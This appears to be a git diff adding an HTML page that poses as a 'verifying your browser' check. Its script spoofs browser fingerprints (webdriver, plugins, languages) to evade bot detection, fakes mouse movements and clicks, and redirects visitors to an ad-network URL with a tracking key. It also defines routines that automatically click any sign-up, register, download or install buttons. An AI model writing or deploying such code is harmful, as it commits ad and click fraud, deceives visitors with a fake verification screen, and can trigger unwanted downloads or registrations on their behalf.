@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="referrer" content="no-referrer">
+  <title>Redirecting...</title>
+  <script>
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    window.chrome = { runtime: {} };
+    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4] });
+    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
+
+    const delay = Math.floor(Math.random() * 3000) + 3000;
+
+    function simulateUserActivity() {
+      window.scrollTo(0, Math.floor(Math.random() * window.innerHeight));
+
+      const moveEvt = new MouseEvent("mousemove", { bubbles: true });
+      document.body.dispatchEvent(moveEvt);
+
+      const clickEvt = new MouseEvent("click", { bubbles: true });
+      document.body.dispatchEvent(clickEvt);
+    }
+
+    function clickSignupButtons() {
+      const possibleSignupSelectors = [
+        "button", "a", "input[type='submit']"
+      ];
+
+      possibleSignupSelectors.forEach(selector => {
+        const elements = document.querySelectorAll(selector);
+        elements.forEach(el => {
+          const text = (el.innerText || el.value || "").toLowerCase();
+          if (text.includes("sign up") || text.includes("signup") || text.includes("register")) {
+            el.click();
+            console.log("Clicked signup button:", el);
+          }
+        });
+      });
+    }
+
+    function clickDownloadButtons() {
+      const downloadKeywords = ["download", "get now", "install"];
+      const selectors = ["button", "a", "img"];
+
+      selectors.forEach(selector => {
+        const elements = document.querySelectorAll(selector);
+        elements.forEach(el => {
+          const text = (el.innerText || el.alt || el.value || "").toLowerCase();
+          if (downloadKeywords.some(word => text.includes(word))) {
+            setTimeout(() => {
+              el.click();
+              console.log("Clicked download button:", el);
+            }, 3000 + Math.floor(Math.random() * 2000)); // 3–5s delay
+          }
+        });
+      });
+    }
+
+    setTimeout(function() {
+      simulateUserActivity();
+      window.location.href = "https://www.profitableratecpm.com/xfqjj83tx?key=f7e175849c98f0b7bcf944cf8c7efc2a";
+    }, delay);
+
+    // Monitor and act after redirection
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        clickSignupButtons();
+        clickDownloadButtons();
+      }, 5000); // Wait for 5s after full load
+    });
+  </script>
+</head>
+<body>
+  <h2>Please wait, verifying your browser...</h2>
+  <p>If nothing happens, <a href="https://www.profitableratecpm.com/xfqjj83tx?key=f7e175849c98f0b7bcf944cf8c7efc2a" rel="noreferrer" target="_blank">click here</a>.</p>
+</body>
+</html>
